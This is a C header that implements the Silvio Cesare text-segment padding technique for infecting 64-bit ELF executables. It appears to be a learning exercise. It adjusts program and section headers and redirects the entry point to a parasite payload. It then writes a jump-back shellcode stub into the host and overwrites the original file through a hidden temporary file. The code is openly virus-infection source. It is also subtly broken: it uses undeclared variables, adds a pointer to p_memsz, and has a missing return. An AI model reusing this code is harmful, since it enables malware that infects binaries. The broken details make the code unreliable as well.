#ifndef __SILVIO_H__
#define __SILVIO_H__
#define JMP_PATCH_OFFSET 1 //how many bytes into the shellcode do we patch
/**
  * movl $addr, %eax;
  * jmp *eax;
  */
char parasite_shellcode[] = "\xb8\x00\x00\x00\x00"
							"\xff\xe0";

#define TMP "/TMP/.infected"

/**
 * 
 *  插入代码
 *
 *  note: jmp_code_offset contains the offset into the payload
 *  shellcode that has the branch instruction to patch with the
 *  original offset so control flow can be transferred back to
 *  the host.
 *
 * @author chris (2019/11/15)
 * 
 * @param hosts_name 
 * @param psize 
 * @param hsize 
 * @param mem 
 * @param end_of_text 
 * @param parasite 
 * @param jmp_code_offset 
 */
void insert_parasite(char *hosts_name, size_t psize, size_t hsize, uint8_t *mem, size_t end_of_text,
	 uint8_t *parasite, uint32_t jmp_code_offset) {
	int ofd;
	unsigned int c;
	int i,t = 0;
	ofd=open(TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IXUSR | S_IWUSR);
	write(ofd, mem, end_of_text);
	*(uint32_t *)&parasite[jmp_code_offset] = old_e_entry;
	write(ofd, parasite, psize);
	lseek(ofd, PAGE_SIZE - psize, SEEK_CUR);
	mem += end_of_text;
	unsigned int sum = end_of_text + PAGE_SIZE;
	unsigned int last_chunk = hsize - end_of_text;
	write(ofd, mem, last_chunk);
	rename(TMP, hosts_name);
	close(ofd);
}

/**
 * 1. 将ELF文件头中的ehdr->e_shoff增加了PAGE_SIZE的大小值
 *2. 定位text段的phdr
 *  - 将入口点修改为寄生代码的位置
 *  - `ehdr->e_entry = phdr[TEXT].p_vaddr + phdr[TEXT].p_filesz`
 *  - 将phdr[TEXT].p_filesz增加寄生代码的长度值
 *  - 将phdr[TEXT].p_memsz增加寄生代码的长度值
 * 3. 对每个phdr，如果对应的段位于寄生代码之后，则将phdr[x].p_offset增加PAGE_SIZE大小的字节
 * 4. 找到text段的最后一个shdr，将shdr[x].sh_size增加寄生代码的长度值（因为在这个节中将会存放寄生代码）
 * 5. 对每个位于寄生代码插入位置之后的shdr，将shdr[x].sh_offset增加PAGE_SIZE的大小值
 * 6. 将真正的寄生代码插入到text段的file_base+phdr[TEXT].p_filesz
 * 
 * @author chris (2019/11/15)
 * 
 * @param host 
 * @param base 
 * @param payload 
 * @param host_len 
 * @param parasite_len 
 * 
 * @return int 
 */
int silvio_text_infect(char *host,  void *base,  void *payload, size_t host_len, size_t parasite_len)
{
	Elf64_Addr o_entry;
	Elf64_Addr o_text_filesz;
	Elf64_Addr parasite_vaddr;
	uint64_t end_of_text;
	int found_text;

	uint8_t *mem = (uint8_t *)base;
	uint8_t *parasite = (uint8_t *)payload;

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
	Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	/**
	 * Adjust program headers
	 */
	for (found_text = 0, i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD) {
			if (phdr[i].p_offset == 0) {
				/**
				 * TEXT段
				 */
				o_text_filesz = phdr[i].p_filesz;
				end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
				//寄生代码的虚拟地址
				parasite_vaddr = phdr[i].p_vaddr + o_text_filesz;
				//TEXT段的p_filesz增加寄生代码的长度值
				phdr[i].p_filesz += parasite_len;
				//TEXT段的p_memsz增加寄生代码的长度值
				phdr[i].p_memsz += parasite;
				for (j = i + 1; j < ehdr->e_phnum; ++j) {
					/**
					 * 对每个phdr，如果对应的段位于寄生代码之后，则将phdr[x].p_offset增加PAGE_SIZE大小的字节
					 */
					if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz) {
						phdr[j].p_offset += PAGE_SIZE;
					}
				}
				break;
			}
		}
	}
	/**
	 * 对每个位于寄生代码插入位置之后的shdr，将shdr[x].sh_offset增加PAGE_SIZE的大小值
	 */
	for (i = 0; i < ehdr->e_shnum;++i) {
		if (shdr[i].sh_addr > parasite_vaddr) {
			shdr[i].sh_offset += PAGE_SIZE;
		} else {
			//找到text段的最后一个shdr，将shdr[x].sh_size增加寄生代码的长度值（因为在这个节中将会存放寄生代码）
			if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr) {
				shdr[i].sh_size += parasite_len;
			}
		}
	}
	
	insert_parasite(host, parasite_len, host_len, base, end_of_text, parasite, JMP_PATCH_OFFSET);
}
#endif
